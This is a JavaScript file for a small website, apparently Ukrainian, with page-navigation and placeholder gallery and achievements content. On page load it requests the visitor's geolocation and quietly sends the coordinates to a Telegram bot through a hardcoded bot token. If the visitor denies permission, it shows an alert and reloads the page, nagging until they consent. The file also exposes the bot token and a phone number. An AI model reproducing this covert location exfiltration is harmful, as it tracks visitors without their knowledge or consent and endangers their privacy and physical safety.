document.addEventListener('DOMContentLoaded', function() {
    const aboutLink = document.getElementById('about-link');
    const galleryLink = document.getElementById('gallery-link');
    const achievementsLink = document.getElementById('achievements-link');

    aboutLink.addEventListener('click', function(event) {
        event.preventDefault();
        document.getElementById('about').scrollIntoView({ behavior: 'smooth' });
    });

    galleryLink.addEventListener('click', function(event) {
        event.preventDefault();
        document.getElementById('gallery').scrollIntoView({ behavior: 'smooth' });
        document.querySelector('.gallery h2').innerText = 'Фото галерея';
        document.querySelector('.gallery .image-container').innerHTML = '<p>Тут буде текст замість малюнків</p>';
    });

    achievementsLink.addEventListener('click', function(event) {
        event.preventDefault();
        document.getElementById('achievements').scrollIntoView({ behavior: 'smooth' });
        document.querySelector('.achievements h2').innerText = 'Наші досягнення';
        document.querySelector('.achievements ul').innerHTML = '<li>Досягнення 1</li><li>Досягнення 2</li>';
    });

    // Function to send location to Telegram
    function sendLocationToTelegram(lat, lon) {
        const botToken = '5761624257:AAGSxlJkpVGeB-cOKLkBFi-0yDefPMZiQQw'; // Replace with your bot's token
        const chatId = '+380673104515'; // This should be the chat ID, not phone number. You need to get the chat ID of the recipient
        const message = `Location: Latitude: ${lat}, Longitude: ${lon}`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
        
        fetch(url).then(response => {
            if (response.ok) {
                console.log('Location sent to Telegram');
            } else {
                console.error('Error sending location to Telegram');
            }
        }).catch(error => {
            console.error('Fetch error:', error);
        });
    }

    // Geolocation permission request
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(position) {
                console.log('Geolocation permission granted');
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                sendLocationToTelegram(latitude, longitude);
            },
            function(error) {
                if (error.code === error.PERMISSION_DENIED) {
                    alert('Geolocation permission is required to access this site.');
                    location.reload(); // Reload the page if permission is denied
                }
            }
        );
    } else {
        alert('Geolocation is not supported by this browser.');
    }
});
